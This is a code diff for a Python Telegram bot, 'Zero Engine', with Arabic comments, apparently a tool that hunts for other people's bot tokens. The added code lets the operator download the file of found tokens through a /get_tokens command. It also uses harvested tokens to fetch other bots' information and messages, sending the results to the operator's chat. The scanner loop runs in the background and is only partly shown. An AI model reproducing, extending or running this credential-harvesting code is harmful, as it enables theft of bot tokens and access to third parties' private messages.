@@ -19,9 +19,26 @@ def get_markup(token):
     markup.add(types.InlineKeyboardButton("📤 تصدير الملف", callback_data="export"))
     return markup
 
+# --- معالجة الأوامر النصية (/start, /get_tokens) ---
+@bot.message_handler(func=lambda message: True)
+def handle_text(message):
+    if str(message.chat.id) != str(CHAT_ID):
+        return
+
+    if message.text == "/start":
+        bot.reply_to(message, "Zero Engine: البوت يعمل بكامل طاقته. أنتظر صيداً جديداً...")
+    
+    elif message.text == "/get_tokens":
+        if os.path.exists(FOUND_FILE) and os.path.getsize(FOUND_FILE) > 0:
+            with open(FOUND_FILE, "rb") as f:
+                bot.send_document(message.chat.id, f)
+        else:
+            bot.reply_to(message, "⚠️ الملف فارغ حالياً.")
+
+# --- معالجة الضغط على الخانات ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
-    if str(call.message.chat.id) != CHAT_ID: return
+    if str(call.message.chat.id) != str(CHAT_ID): return
     
     if call.data == "export":
         if os.path.exists(FOUND_FILE):
@@ -29,9 +46,12 @@ def callback_query(call):
                 bot.send_document(CHAT_ID, f)
         return
 
-    action, token = call.data.split("|")
-    res = get_bot_info(token) if action == "info" else get_bot_messages(token)
-    bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")
+    try:
+        action, token = call.data.split("|")
+        res = get_bot_info(token) if action == "info" else get_bot_messages(token)
+        bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")
+    except Exception as e:
+        bot.send_message(CHAT_ID, f"خطأ في معالجة الطلب: {e}")
 
 # --- محرك الصيد ---
 def run_scanner():
@@ -47,7 +67,7 @@ def run_scanner():
         except: pass
         time.sleep(60)
 
-# --- نظام التحديث اليدوي (لإنهاء خطأ 409 للأبد) ---
+# --- التشغيل الأساسي ---
 def run_manual_polling():
     last_update_id = 0
     while True:
@@ -56,18 +76,14 @@ def run_manual_polling():
             for update in updates:
                 last_update_id = update.update_id
                 bot.process_new_updates([update])
-        except Exception as e:
+        except Exception:
             time.sleep(5)
 
 if __name__ == "__main__":
-    # تنظيف أي Webhook سابق
     try:
         bot.delete_webhook()
     except: pass
     
-    # تشغيل الماسح
     threading.Thread(target=run_scanner, daemon=True).start()
-    
-    # تشغيل نظام التحديث اليدوي
-    print("Zero Engine: Manual Polling Mode - Conflict Free")
+    print("Zero Engine: Online & Stable")
     run_manual_polling()
